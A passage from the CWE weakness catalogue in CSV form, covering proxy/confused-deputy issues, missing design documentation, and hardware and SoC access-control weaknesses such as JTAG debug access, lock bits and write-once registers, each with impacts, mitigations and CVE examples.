this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Enforce the use of strong mutual authentication mechanism between the two parties.::PHASE:Architecture and Design:DESCRIPTION:Whenever a product is an intermediary or proxy for transactions between two other components, the proxy core should not drop the identity of the initiator of the transaction. The immutability of the identity of the initiator must be maintained and should be forwarded all the way to the target.::\",\"::REFERENCE:CVE-1999-0017:DESCRIPTION:FTP bounce attack. The design of the protocol allows an attacker to modify the PORT command to cause the FTP server to connect to other machines besides the attacker's.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0017::REFERENCE:CVE-1999-0168:DESCRIPTION:RPC portmapper could redirect service requests from an attacker to another entity, which thinks the requests came from the portmapper.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0168::REFERENCE:CVE-2005-0315:DESCRIPTION:FTP server does not ensure that the IP address in a PORT command is the same as the FTP user's session, allowing port scanning by proxy.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0315::REFERENCE:CVE-2002-1484:DESCRIPTION:Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1484::REFERENCE:CVE-2004-2061:DESCRIPTION:CGI script accepts and retrieves incoming URLs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2061::REFERENCE:CVE-2001-1484:DESCRIPTION:Bounce attack allows access to TFTP from trusted side.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1484::REFERENCE:CVE-2010-1637:DESCRIPTION:Web-based mail program allows internal network scanning using a modified POP3 port number.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1637::REFERENCE:CVE-2009-0037:DESCRIPTION:URL-downloading library automatically follows redirects to file:// and scp:// URLs:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0037::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unintended proxy/intermediary::TAXONOMY NAME:PLOVER:ENTRY NAME:Proxied Trusted Channel::TAXONOMY NAME:WASC:ENTRY ID:32:ENTRY NAME:Routing Detour::\",::219::465::,\"::TYPE:Relationship:NOTE:This weakness has a chaining relationship with CWE-668 (Exposure of Resource to Wrong Sphere) because the proxy effectively provides the attacker with access to the target's resources that the attacker cannot directly obtain.::TYPE:Maintenance:NOTE:This could possibly be considered as an emergent resource.::TYPE:Theoretical:NOTE:It could be argued that the confused deputy is a fundamental aspect of most vulnerabilities that require an active attacker. Even for common implementation issues such as buffer overflows, SQL injection, OS command injection, and path traversal, the vulnerable program already has the authorization to run code or access files. The vulnerability arises when the attacker causes the program to run unexpected code or access unexpected files.::\",\n1053,\"Missing Documentation for Design\",Base,Incomplete,\"The product does not have documentation that represents how it is designed.\",\"This issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.\",::NATURE:ChildOf:CWE ID:1059:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1059,\"Insufficient Technical Documentation\",Class,Incomplete,\"The product does not contain sufficient technical or engineering documentation (whether on paper or in electronic form) that contains descriptions of all the relevant software/hardware elements of the product, such as its usage, structure, architectural components, interfaces, design, implementation, configuration, operation, etc.\",\"When technical documentation is limited or lacking, products are more difficult to maintain. This indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. When using time-limited or labor-limited third-party/in-house security consulting services (such as threat modeling, vulnerability discovery, or pentesting), insufficient documentation can force those consultants to invest unnecessary time in learning how the product is organized, instead of focusing their expertise on finding the flaws or suggesting effective mitigations. With respect to hardware design, the lack of a formal, final manufacturer reference can make it difficult or impossible to evaluate the final product, including post-manufacture verification. One cannot ensure that design functionality or operation is within acceptable tolerances, conforms to specifications, and is free from unexpected behavior. Hardware-related documentation may include engineering artifacts such as hardware description language (HDLs), netlists, Gerber files, Bills of Materials, EDA (Electronic Design Automation) tool files, etc.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Documentation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context:IMPACT:Hide Activities:IMPACT:Reduce Reliability:IMPACT:Quality Degradation:IMPACT:Reduce Maintainability:NOTE:Without a method of verification, one cannot be sure that everything only functions as expected.::\",\"\",\"::PHASE:Documentation Architecture and Design:DESCRIPTION:Ensure that design documentation is detailed enough to allow for post-manufacturing verification.::\",\"::REFERENCE:CVE-2022-3203:DESCRIPTION:A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).:LINK:https://www.cve.org/CVERecord?id=CVE-2022-3203::\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.02.03 BR::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.02.03 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.03 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SG-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SG-2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SG-3::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SG-4::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SG-5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SG-6::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SG-7::\",,\"\",\n1189,\"Improper Isolation of Shared Resources on System-on-a-Chip (SoC)\",Base,Stable,\"The System-On-a-Chip (SoC) does not properly isolate shared resources between trusted and untrusted agents.\",\"A System-On-a-Chip (SoC) has a lot of functionality, but it may have a limited number of pins or pads. A pin can only perform one function at a time. However, it can be configured to perform multiple different functions. This technique is called pin multiplexing. Similarly, several resources on the chip may be shared to multiplex and support different features or functions. When such resources are shared between trusted and untrusted agents, untrusted agents may be able to access the assets intended to be accessed only by the trusted agents.\",::NATURE:ChildOf:CWE ID:653:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1000::NATURE:PeerOf:CWE ID:1331:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If resources being used by a trusted user are shared with an untrusted user, the untrusted user may be able to modify the functionality of the shared resource of the trusted user.::SCOPE:Integrity:IMPACT:Quality Degradation:NOTE:The functionality of the shared resource may be intentionally degraded.::\",\"::METHOD:Automated Dynamic Analysis:DESCRIPTION:Pre-silicon / post-silicon: Test access to shared systems resources (memory ranges, control registers, etc.) from untrusted software to verify that the assets are not incorrectly exposed to untrusted agents. Note that access to shared resources can be dynamically allowed or revoked based on system flows. Security testing should cover such dynamic shared resource allocation and access control modification flows.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:When sharing resources, avoid mixing agents of varying trust levels. Untrusted agents should not share resources with trusted agents.::\",\"::REFERENCE:CVE-2020-8698:DESCRIPTION:Processor has improper isolation of shared resources allowing for information disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8698::REFERENCE:CVE-2019-6260:DESCRIPTION:Baseboard Management Controller (BMC) device implements Advanced High-performance Bus (AHB) bridges that do not require authentication for arbitrary read and write access to the BMC's physical address space from the host, and possibly the network [REF-1138].:LINK:https://www.cve.org/CVERecord?id=CVE-2019-6260::\",,,\"\",::124::,\"\",\n1190,\"DMA Device Enabled Too Early in Boot Phase\",Base,Draft,\"The product enables a Direct Memory Access (DMA) capable device before the security configuration settings are established, which allows an attacker to extract data from or gain privileges on the product.\",\"DMA is included in a number of devices because it allows data transfer between the computer and the connected device, using direct hardware access to read or write directly to main memory without any OS interaction. An attacker could exploit this to access secrets. Several virtualization-based mitigations have been introduced to thwart DMA attacks. These are usually configured/setup during boot time. However, certain IPs that are powered up before boot is complete (known as early boot IPs) may be DMA capable. Such IPs, if not trusted, could launch DMA attacks and gain access to assets that should otherwise be protected.\",::NATURE:ChildOf:CWE ID:696:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Modify Memory:LIKELIHOOD:High:NOTE:DMA devices have direct write access to main memory and due to time of attack will be able to bypass OS or Bootloader access control.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Utilize an IOMMU to orchestrate IO access from the start of the boot process.::\",\"\",,,\"\",::180::,\"\",\n1191,\"On-Chip Debug and Test Interface With Improper Access Control\",Base,Stable,\"The chip does not implement or does not correctly perform access control to check whether users are authorized to access internal registers and test modes through the physical debug/test interface.\",\"A device's internal information may be accessed through a scan chain of interconnected internal registers, usually through a JTAG interface. The JTAG interface provides access to these registers in a serial fashion in the form of a scan chain for the purposes of debugging programs running on a device. Since almost all information contained within a device may be accessed over this interface, device manufacturers typically insert some form of authentication and authorization to prevent unintended use of this sensitive information. This mechanism is implemented in addition to on-chip protections that are already present. If authorization, authentication, or some other form of access control is not implemented or not implemented correctly, a user may be able to bypass on-chip protection mechanisms through the debug interface. Sometimes, designers choose not to expose the debug pins on the motherboard. Instead, they choose to hide these pins in the intermediate layers of the board. This is primarily done to work around the lack of debug authorization inside the chip. In such a scenario (without debug authorization), when the debug interface is exposed, chip internals are accessible to an attacker.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:LIKELIHOOD:High::SCOPE:Confidentiality:IMPACT:Read Memory:LIKELIHOOD:High::SCOPE:Authorization:IMPACT:Execute Unauthorized Code or Commands:LIKELIHOOD:High::SCOPE:Integrity:IMPACT:Modify Memory:LIKELIHOOD:High::SCOPE:Integrity:IMPACT:Modify Application Data:LIKELIHOOD:High::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:LIKELIHOOD:High::\",\"::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:Authentication and authorization of debug and test interfaces should be part of the architecture and design review process. Withholding of private register documentation from the debug and test interface public specification (Security by obscurity) should not be considered as sufficient security.::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:Dynamic tests should be done in the pre-silicon and post-silicon stages to verify that the debug and test interfaces are not open by default.::METHOD:Fuzzing:DESCRIPTION:Tests that fuzz Debug and Test Interfaces should ensure that no access without appropriate authentication and authorization is possible.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:If feasible, the manufacturer should disable the JTAG interface or implement authentication and authorization for the JTAG interface. If authentication logic is added, it should be resistant to timing attacks. Security-sensitive data stored in registers, such as keys, etc. should be cleared when entering debug mode.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2019-18827:DESCRIPTION:chain: JTAG interface is not disabled (CWE-1191) during ROM code execution, introducing a race condition (CWE-362) to extract encryption keys:LINK:https://www.cve.org/CVERecord?id=CVE-2019-18827::\",,,\"\",::1::180::,\"::TYPE:Relationship:NOTE:CWE-1191 and CWE-1244 both involve physical debug access, but the weaknesses are different. CWE-1191 is effectively about missing authorization for a debug interface, i.e. JTAG. CWE-1244 is about providing internal assets with the wrong debug access level, exposing the asset to untrusted debug agents.::\",\n1192,\"Improper Identifier for IP Block used in System-On-Chip (SOC)\",Base,Draft,\"The System-on-Chip (SoC) does not have unique, immutable identifiers for each of its components.\",\"A System-on-Chip (SoC) comprises several components (IP) with varied trust requirements. It is required that each IP is identified uniquely and should distinguish itself from other entities in the SoC without any ambiguity. The unique secured identity is required for various purposes. Most of the time the identity is used to route a transaction or perform certain actions, including resetting, retrieving a sensitive information, and acting upon or on behalf of something else. There are several variants of this weakness: A missing identifier is when the SoC does not define any mechanism to uniquely identify the IP. An insufficient identifier might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. A misconfigured mechanism occurs when a mechanism is available but not implemented correctly. An ignored identifier occurs when the SoC/IP has not applied any policies or does not act upon the identifier securely.\",::NATURE:ChildOf:CWE ID:657:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Every identity generated in the SoC should be unique and immutable in hardware. The actions that an IP is trusted or not trusted should be clearly defined, implemented, configured, and tested. If the definition is implemented via a policy, then the policy should be immutable or protected with clear authentication and authorization.::\",\"\",,,\"\",::113::,\"\",\n1193,\"Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\",Base,Draft,\"The product enables components that contain untrusted firmware before memory and fabric access controls have been enabled.\",\"After initial reset, System-on-Chip (SoC) fabric access controls and other security features need to be programmed by trusted firmware as part of the boot sequence. If untrusted IPs or peripheral microcontrollers are enabled first, then the untrusted component can master transactions on the hardware bus and target memory or other assets to compromise the SoC boot firmware.\",::NATURE:ChildOf:CWE ID:696:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:LIKELIHOOD:High:NOTE:An untrusted component can master transactions on the HW bus and target memory or other assets to compromise the SoC boot firmware.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:The boot sequence should enable fabric access controls and memory protections before enabling third-party hardware IPs and peripheral microcontrollers that use untrusted firmware.::\",\"\",,,\"\",::1::180::,\"\",\n1209,\"Failure to Disable Reserved Bits\",Base,Incomplete,\"The reserved bits in a hardware design are not disabled prior to production. Typically, reserved bits are used for future capabilities and should not support any functional logic in the design. However, designers might covertly use these bits to debug or further develop new capabilities in production hardware. Adversaries with access to these bits will write to them in hopes of compromising hardware state.\",\"Reserved bits are labeled as such so they can be allocated for a later purpose. They are not to do anything in the current design. However, designers might want to use these bits to debug or control/configure a future capability to help minimize time to market (TTM). If the logic being controlled by these bits is still enabled in production, an adversary could use the logic to induce unwanted/unsupported behavior in the hardware.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:The Designer and Implementer have to make a conscious choice to do this::PHASE:Implementation:NOTE:The Designer and Implementer have to make a conscious choice to do this::PHASE:Documentation:NOTE:If documentation labels anything for future use, reserved, or the like, such labeling could indicate to an attacker a potential attack point::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Varies by Context:NOTE:This type of weakness all depends on the capabilities of the logic being controlled or configured by the reserved bits.::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Include a feature to disable reserved bits.::PHASE:Integration:DESCRIPTION:Any writes to these reserve bits are blocked (e.g., ignored, access-protected, etc.), or an exception can be asserted.::\",\"\",,,\"\",::121::,\"\",\n1220,\"Insufficient Granularity of Access Control\",Base,Incomplete,\"The product implements access controls via a policy or other feature with the intention to disable or restrict accesses (reads and/or writes) to assets in a system from untrusted agents. However, implemented access controls lack required granularity, which renders the control policy too broad because it allows accesses from unauthorized agents to the security-sensitive assets.\",\"Integrated circuits and hardware engines can expose accesses to assets (device configuration, keys, etc.) to trusted firmware or a software module (commonly set by BIOS/bootloader). This access is typically access-controlled. Upon a power reset, the hardware or system usually starts with default values in registers, and the trusted firmware (Boot firmware) configures the necessary access-control protection. A common weakness that can exist in such protection schemes is that access controls or policies are not granular enough. This condition allows agents beyond trusted agents to access assets and could lead to a loss of functionality or the ability to set up the device securely. This further results in security risks from leaked, sensitive, key material to modification of device configuration.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during hardware implementation and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Other:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation Testing:DESCRIPTION:Access-control-policy protections must be reviewed for design inconsistency and common weaknesses. Access-control-policy definition and programming flow must be tested in pre-silicon, post-silicon testing.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2022-24985:DESCRIPTION:A form hosting website only checks the session authentication status for a single form, making it possible to bypass authentication when there are multiple forms:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24985::REFERENCE:CVE-2021-36934:DESCRIPTION:An operating system has an overly permission Access Control List onsome system files, including those related to user passwords:LINK:https://www.cve.org/CVERecord?id=CVE-2021-36934::\",,,\"\",::1::180::,\"\",\n1221,\"Incorrect Register Defaults or Module Parameters\",Base,Incomplete,\"Hardware description language code incorrectly defines register defaults or hardware Intellectual Property (IP) parameters to insecure values.\",\"Integrated circuits and hardware IP software programmable controls and settings are commonly stored in register circuits. These register contents have to be initialized at hardware reset to defined default values that are hard coded in the hardware description language (HDL) code of the hardware unit. Hardware descriptive languages also support definition of parameter variables, which can be defined in code during instantiation of the hardware IP module. Such parameters are generally used to configure a specific instance of a hardware IP in the design. The system security settings of a hardware design can be affected by incorrectly defined default values or IP parameters. The hardware IP would be in an insecure state at power reset, and this can be exposed or exploited by untrusted software running on the system. Both register defaults and parameters are hardcoded values, which cannot be changed using software or firmware patches but must be changed in hardware silicon. Thus, such security issues are considerably more difficult to address later in the lifecycle. Hardware designs can have a large number of such parameters and register defaults settings, and it is important to have design tool support to check these settings in an automated way and be able to identify which settings are security sensitive.\",::NATURE:ChildOf:CWE ID:1419:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Such issues could be introduced during implementation of hardware design, since IP parameters and defaults are defined in HDL code and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Varies by Context:NOTE:Degradation of system functionality, or loss of access control enforcement can occur.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:During hardware design, all the system parameters and register defaults must be reviewed to identify security sensitive settings.::PHASE:Implementation:DESCRIPTION:The default values of these security sensitive settings need to be defined as part of the design review phase.::PHASE:Testing:DESCRIPTION:Testing phase should use automated tools to test that values are configured per design specifications.::\",\"\",,,\"\",::166::,\"\",\n1222,\"Insufficient Granularity of Address Regions Protected by Register Locks\",Variant,Incomplete,\"The product defines a large address region protected from modification by the same register lock control bit. This results in a conflict between the functional requirement that some addresses need to be writable by software during operation and the security requirement that the system configuration lock bit must be set during the boot process.\",\"Integrated circuits and hardware IPs can expose the device configuration controls that need to be programmed after device power reset by a trusted firmware or software module (commonly set by BIOS/bootloader) and then locked from any further modification. In hardware design, this is commonly implemented using a programmable lock bit which enables/disables writing to a protected set of registers or address regions. When the programmable lock bit is set, the relevant address region can be implemented as a hardcoded value in hardware logic that cannot be changed later. A problem can arise wherein the protected region definition is not granular enough. After the programmable lock bit has been set, then this new functionality cannot be implemented without change to the hardware design.\",::NATURE:ChildOf:CWE ID:1220:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues are introduced during hardware architecture and design since software controls and configuration are defined during these phases and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Other:NOTE:System security configuration cannot be defined in a way that does not conflict with functional requirements of device.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:The defining of protected locked registers should be reviewed or tested early in the design phase with software teams to ensure software flows are not blocked by the security locks. As an alternative to using register lock control bits and fixed access control regions, the hardware design could use programmable security access control configuration so that device trusted firmware can configure and change the protected regions based on software usage and security models.::\",\"\",,,\"\",::679::,\"\",\n1223,\"Race Condition for Write-Once Attributes\",Base,Incomplete,\"A write-once register in hardware design is programmable by an untrusted software component earlier than the trusted software component, resulting in a race condition issue.\",\"Integrated circuits and hardware IP software programmable controls and settings are commonly stored in register circuits. These register contents have to be initialized at hardware reset to defined default values that are hard coded in the hardware description language (HDL) code of the hardware unit. A common security protection method used to protect register settings from modification by software is to make them write-once. This means the hardware implementation only allows writing to such registers once, and they become read-only after having been written once by software. This is useful to allow initial boot software to configure systems settings to secure values while blocking runtime software from modifying such hardware settings. Implementation issues in hardware design of such controls can expose such registers to a race condition security flaw. For example, consider a hardware design that has two different software/firmware modules executing in parallel. One module is trusted (module A) and another is untrusted (module B). In this design it could be possible for Module B to send write cycles to the write-once register before Module A. Since the field is write-once the programmed value from Module A will be ignored and the pre-empted value programmed by Module B will be used by hardware.\",::NATURE:ChildOf:CWE ID:362:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness can appear in designs that use register write-once attributes with two or more software/firmware modules with varying levels of trust executing in parallel.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:System configuration cannot be programmed in a secure way.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:During hardware design all register write-once or sticky fields must be evaluated for proper configuration.::PHASE:Testing:DESCRIPTION:The testing phase should use automated tools to test that values are not reprogrammable and that write-once fields lock on writing zeros.::\",\"\",,,\"\",::26::,\"\",\n1224,\"Improper Restriction of Write-Once Bit Fields\",Base,Incomplete,\"The hardware design control register sticky bits or write-once bit fields are improperly implemented, such that they can be reprogrammed by software.\",\"Integrated circuits and hardware IP software programmable controls and settings are commonly stored in register circuits. These register contents have to be initialized at hardware reset to define default values that are hard coded in the hardware description language (HDL) code of the hardware unit. A common security protection method used to protect register settings from modification by software is to make the settings write-once or sticky. This allows writing to such registers only once, whereupon they become read-only. This is useful to allow initial boot software to configure systems settings to secure values while blocking runtime software from modifying such hardware settings. Failure to implement write-once restrictions in hardware design can expose such registers to being re-programmed by software and written multiple times. For example, write-once fields could be implemented to only be write-protected if they have been set to value 1, wherein they would work as write-1-once and not write-once.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:Such issues could be introduced during implementation of hardware design, since IP parameters and defaults are defined in HDL code and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Varies by Context:NOTE:System configuration cannot be programmed in a secure way.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:During hardware design all register write-once or sticky fields must be evaluated for proper configuration.::PHASE:Testing:DESCRIPTION:The testing phase should use automated tools to test that values are not reprogrammable and that write-once fields lock on writing zeros.::\",\"\",,,\"\",::680::,\"\",\n1231,\"Improper Prevention of Lock Bit Modification\",Base,Stable,\"The product uses a trusted lock bit for restricting access to registers, address regions, or other resources, but the product does not prevent the value of the lock bit from being modified after it has been set.\",\"In integrated circuits and hardware intellectual property (IP) cores, device configuration controls are commonly programmed after a device power reset by a trusted firmware or software module (e.g., BIOS/bootloader) and then locked from any further modification. This behavior is commonly implemented using a trusted lock bit. When set, the lock bit disables writes to a protected set of registers or address regions. Design or coding errors in the implementation of the lock bit protection feature may allow the lock bit to be modified or cleared by software after it has been set. Attackers might be able to unlock the system and features that the bit is intended to protect.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Modify Memory:LIKELIHOOD:High:NOTE:Registers protected by lock bit can be modified even when lock is set.::\",\"::METHOD:Manual Analysis:DESCRIPTION:Set the lock bit. Power cycle the device. Attempt to clear the lock bit. If the information is changed, implement a design fix. Retest. Also, attempt to indirectly clear the lock bit or bypass it.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation Testing:DESCRIPTION:Security lock bit protections must be reviewed for design inconsistency and common weaknesses. Security lock programming flow and lock properties must be tested in pre-silicon and post-silicon testing.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2017-6283:DESCRIPTION:chip reset clears critical read/write lock permissions for RSA function:LINK:https://www.cve.org/CVERecord?id=CVE-2017-6283::\",,,\"\",::680::,\"\",\n1232,\"Improper Lock Behavior After Power State Transition\",Base,Incomplete,\"Register lock bit protection disables changes to system configuration once the bit is set. Some of the protected registers or lock bits become programmable after power state transitions (e.g., Entry and wake from low power sleep modes) causing the system configuration to be changeable.\",\"Devices may allow device configuration controls which need to be programmed after device power reset via a trusted firmware or software module (commonly set by BIOS/bootloader) and then locked from any further modification. This action is commonly implemented using a programmable lock bit, which, when set, disables writes to a protected set of registers or address regions. After a power state transition, the lock bit is set to unlocked. Some common weaknesses that can exist in such a protection scheme are that the lock gets cleared, the values of the protected registers get reset, or the lock become programmable.\",::NATURE:ChildOf:CWE ID:667:VIEW 